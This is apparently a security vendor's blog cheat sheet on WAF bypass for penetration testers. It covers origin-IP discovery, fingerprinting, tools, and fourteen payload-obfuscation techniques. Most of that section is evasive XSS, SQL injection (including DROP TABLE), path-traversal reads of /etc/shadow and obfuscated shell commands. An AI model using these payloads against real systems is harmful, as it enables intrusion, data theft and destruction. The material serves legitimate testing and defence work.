
### What is WAF?

Web application firewall (WAF) is a set of monitors and filters designed to detect and block network attacks on a web application. WAFs refer to the application layer of the OSI model.

The web application firewall is used as a security tool. In real time, it decides whether to grant or deny access.

Companies should be informed that WAF is not a full-fledged information protection tool. Usually, it is included in the overall security system of a web application with other elements such as components that solve the problems of protocols other than HTTP / HTTPS, incident control systems, and anti-fraud services.

When conducting penetration testing, we first identify the real IP address, enumerate the WAF vendor, and try to bypass the WAF. After the defense is broken through, the most exciting part begins. Everything the client has wanted to hide behind the WAF provides room for further penetration testing.


How many times have we bypassed such protection?
It is shocking that every second site is vulnerable to this bypass method and techniques. Since the WAF vendors are trying to maintain static regexp lists to trigger WAF, hackers find new ways to bypass this protection by masking payloads. There are almost no locks that cannot be broken by a scrap. Therefore, we see an endless game of cat and mouse, hackers against WAFs.
So a summary of reasons for using WAF:

    Defense in Depth approach.
    Detects and blocks attacks against vulnerable web applications.
    Protects against a variety of vulnerabilities. 
    Secures a company’s web environment.

Popular WAF vendors                 
What do to find WAF vendor and real IP address
Real IP disclosure

1. RUN shodan.io or censys.io

2. Search SPF records and TXT records.

SPF and TXT records might have an IP address of a CloudFlare less origin point.

3. Also can check securitytrails.com in field Historical data might have original IP in old records.
How to proof WAF set up correctly:

    WAFs use  standard ports 80, 443, 8000, 8008, 8080, and 8088 ports.
    WAFs set their own cookies in requests.
    WAFs associate themselves with separate headers.
    WAFs expose themselves in the Server header.
    WAFs expose themselves in the response content.
    WAFs reply with unique response codes upon malicious requests.

    Send a standard GET request from a browser, intercept, and record response headers (specifical cookies).
    Send a request from the command line (e.g., cURL), and then check response content and headers.
    Send GET requests to random open ports and check banners that might expose the WAFs identity.
    Try some SQL injection payloads like: ” or 1 = 1 — to login forms or forget a password.
    Try with noisy XSS payloads like <script>confirm()</script> in some input fields.
    Try to add ../../../etc/passwd to a random parameter in the URL address.
    Add some payloads like ‘ OR SLEEP(5) OR ‘ at the end of URLs to any random parameter.
    Send GET requests with outdated protocols like HTTP/0.9 (HTTP/0.9 does not support POST type queries).
    Check the server header upon different types of interactions.
    Send a raw crafted FIN&RST packet to the server and identify a response.
    Side-Channel Attacks – Examine the timing behavior of the request and response content.

Most hackers use automated tools to speed up processes to bypass WAFs on resources of their interest. We have compiled a small list of tools that hackers use every day. The use of these tools is just the first step to checking what is open to hackers. Always do a regular penetration test, as WAFs replenish their base every day, in ways they can get around them. But hackers also do not sleep and every day they look for new ways to bypass WAFs.

It is very cool when companies do a penetration test and participate in bug bounty programs, which allow them to attract thousands of white hat hackers to their side, and jointly fix the mistakes made by the developers and WAFs.
Tools to Check and Bypass WAFs:

w3af — Web Application Attack and Audit Framework

wafw00f — Identify and fingerprint Web Application Firewall

BypassWAF – Bypass firewalls by abusing DNS history. This tool will search for old DNS A records and check if the server replies for that domain. 

CloudFail – is a tactical reconnaissance tool that tries to find the original IP address behind the Cloudflare WAF.
Techniques to bypass WAF:
1. Case Toggling Technique

    Combine upper and lower case characters for creating efficient payloads.

Basic Request:

<script>confirm()</script>

Bypassed Technique:

<ScrIpT>confirm()</sCRiPt>

Basic Request:

SELECT * FROM * WHERE OWNER = 'NAME_OF_DB'

Bypassed Technique:

sELeCt * fRoM * wHerE OWNER = 'NAME_OF_DB'

Example in URL:

http://example.com/index.php?page_id=-1 UnIoN SeLeCT 1,2,3,4
2. URL Encoding Technique

    Encode normal payloads with % encoding/URL encoding.
    You can use Burp. It has an encoder/decoder tool.

Blocked by WAF:

<Svg/x=">"/OnLoAD=confirm()//

Bypassed Technique:

%3CSvg%2Fx%3D%22%3E%22%2FOnLoAD%3Dconfirm%28%29%2F%2F

Blocked by WAF:

UniOn(SeLeCt 1,2,3,4,5,6,7,8,9,10)

Bypassed Technique:

UniOn%28SeLeCt+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%29

Example in URL:

https://example.com/page.php?id=1%252f%252a*/UNION%252f%252a /SELECT
3. Unicode Technique

    ASCII characters in Unicode encoding give us great variants for bypassing WAF.
    Encode entire or part of the payload for obtaining results.

Basic Request:

<marquee onstart=prompt()>

Obfuscated:

<marquee onstart=\u0070r\u06f\u006dpt()>

Blocked by WAF:

/?redir=http://google.com

Bypassed Technique:

/?redir=http://google。com (Unicode alternative)

Blocked by WAF:

<marquee loop=1 onfinish=alert()>x

Bypassed technique:

＜marquee loop＝1 onfinish＝alert︵1)>x (Unicode alternative)

Basic Request:

../../etc/shadow

Obfuscated:

%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow
4. HTML Representation Technique

    WebApps encode special characters into HTML. Encoding and render them accordingly.
    Basic bypass cases with HTML encoding numeric and generic.

Basic Request:

"><img src=x onerror=confirm()>

Encoded Payload:

&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt; 

Encoded Payload:

&#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62; 
5. Mixed Encoding Technique

    Such rules often tend to filter out a specific type of encoding.
    Such filters can be bypassed by mixed encoding payloads.
    Newlines and tabs and further add to obfuscation.

Obfuscate Payload:

<A HREF="h
tt p://6 6.000146.0x7.147/">XSS</A>
6. Using Comments Technique

    Comments obfuscate standard payload vectors.
    Different payloads have different ways of obfuscation.

Blocked by WAF:

<script>confirm()</script>

Bypassed Technique:

```<!--><script>confirm/**/()/**/</script>```

Blocked by WAF:

/?id=1+union+select+1,2--

Bypassed Technique:

/?id=1+un/**/ion+sel/**/ect+1,2--

    Insert comments in the middle of attack strings. For instance, /*!SELECT*/ might be overlooked by the WAF but passed on to the target application and processed by a mysql database.

Example in URL:

index.php?page_id=-1 %55nION/**/%53ElecT 1,2,3,4   

   'union%a0select pass from users#

Example in URL:

index.php?page_id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3
 7. Double Encoding Technique

    Web Application Firewall filters tend to encode characters to protect web app.
    Poorly developed filters (without recursion filters) can be bypassed with double encoding.

Basic Request:

http://example/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\

Obfuscate Payload:

http://example/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\

Basic Request:

<script>confirm()</script>

Obfuscate Payload:

%253Cscript%253Econfirm()%253C%252Fscript%253E
8. Wildcard Obfuscation Technique

    Global patterns are used by various command-line utilities to work with multiple files.
    We can change them to run system commands.

Basic Request:

/bin/cat /etc/passwd

Obfuscate Payload:

/???/??t /???/??ss??

Used chars:

/ ? t s

Basic Request:

/bin/nc 127.0.0.1 443

Obfuscate Payload:

/???/n? 2130706433 443

Used chars:

/ ? n [0-9]

Dynamic Payload Generation Technique:

    Programming languages have different patterns and syntaxes for concatenation.
    This allows us to generate payloads that can bypass many filters and rules.

Basic Request:

<script>confirm()</script>

Obfuscate Payload:

<script>eval('con'+'fi'+'rm()')</script>

Basic Request:

/bin/cat /etc/shadow

Obfuscate Payload:

/bi'n'''/c''at' /e'tc'/sh''ad'ow

Bash allows path concatenation for execution.

Basic Request:

<iframe/onload='this["src"]="javascript:confirm()"';>

Obfuscate Payload

<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:con"+"fir"+"m()"';>
9. Junk Characters Technique

    Simple payloads get filtered out easily by WAF.
    Adding some junk chars helps avoid detection (only specific cases ).
    This technique often helps in confusing regex-based firewalls.

Basic Request:

<script>confirm()</script>

Obfuscate Payload:

<script>+-+-1-+-+confirm()</script>

Basic Request:

<BODY onload=confirm()>

Obfuscate Payload:

```<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()>```

Basic Request:

<a href=javascript;alert()>ClickMe

Bypassed Technique:

<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
10. Line Breaks Technique

    A lot of WAFs with regex-based filtering effectively blocks many attempts.
    Line breaks technique (CR and LF) can break firewall regex and bypass stuff.

Basic Request:

<iframe src=javascript:confirm(hacker)">

Obfuscate Payload:

<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(hacker)">
11. Uninitialized Variables Technique

    Wrong regular expression based filters can be evaded with uninitialized bash variables.
    Such value equal to null and acts like empty strings.
    Bash and perl allow such kind of interpretations.

First Level Obfuscation: Normal

    Basic Request:
    /bin/cat /etc/shadow
    Obfuscate Payload:
    /bin/cat$u /etc/shadow$u

Second Level Obfuscation: Position Based

    Basic Request:
    /bin/cat /etc/shadow
    Obfuscate Payload:
    $u/bin$u/cat$u $u/etc$u/shadow$u

Third Level Obfuscation: Random characters

    Basic Request:
    /bin/cat /etc/passwd
    Obfuscate Payload:
    $aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff

12. Tabs and Line Feeds Technique

    Tabs often help to evade firewalls, especially regex-based.
    Tabs can help break WAF regex when the regex is expecting whitespaces and not tabs.

Basic Request:

<IMG SRC="javascript:confirm();">

Bypassed Technique:

<IMG SRC=" javascript:confirm();">

Variant:

<IMG SRC=" jav ascri pt:confirm ();">

Basic Request:

http://test.com/test?id=1 union select 1,2,3

Bypassed Technique:

http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3

Basic Request:

<iframe src=javascript:confirm()></iframe>

Obfuscate Payload:

<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:c&Tab;o&Tab;n&Tab;f&Tab;i&Tab;r&Tab;m&Tab;%28&Tab;%29></iframe>
13. Token Breakers Technique

    Attacks on token attempt to break the logic of splitting a request into tokens with token breakers.
    Token-breakers are symbols that allow affecting the correspondence between an element of a string and a certain token.
    Our request must remain valid while using token-breakers.
    Case Study: Unknown Token for the Tokenizer

Our Payload:

?id=‘-sqlite_version() UNION SELECT passwords FROM users --

    Case Study: Unknown Context for the Parser (Notice the uncontexted bracket)

First Payload :

?id=12);DROP TABLE users --

Second Payload :

?id=133) INTO OUTFILE ‘xxx’ --
14. Obfuscation in Other Formats Technique

    Many web applications support different encoding types and can interpret the encoding.
    We always need to obfuscate the payload to a format not supported by WAF, but the server can smuggle our payload.

IIS Case: 

    IIS 6, 7.5, 8, and 10 allow IBM037 character interpretations.
    Send the encoded parameters with the query.

Original Request:

POST /example.aspx?id7=sometext HTTP/1.1
HOST: target.org
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Content-Length: 27
id2='union all select * from users--

Obfuscated Request with URL Encoding:

POST /example.aspx?%89%84%F7=%A2%95%94%86%A3%88%89%95%87 HTTP/1.1
HOST: target.org
Content-Type: application/x-www-form-urlencoded; charset=ibm037
Content-Length: 127
%89%84%F2=%7D%A4%95%89%97%95%40%81%93%94%40%A2%85%93%85%84%A3%40%5C%40%86%99%97%94%40%A4%A2%85%99%A2%60%60

### Conclusion

Let’s summarize everything written above. Always think outside the box. Try different encoding techniques, and some of them will work. Do not be lazy to check DNS records since it’s the only way to succeed in bug bounty hunting.

Do not forget that any protection can be bypassed in web resources and the WAF is not a panacea for all problems. Hackers do not sleep and always look for new techniques to attack your resources and get profit. Regular penetration testing from Hacken experts, as well as participation in bug bounty programs from HackenProof, will help you avoid many problems. Check more at: https://wp.hacken.io/services/penetrationtesting/

Ref. https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/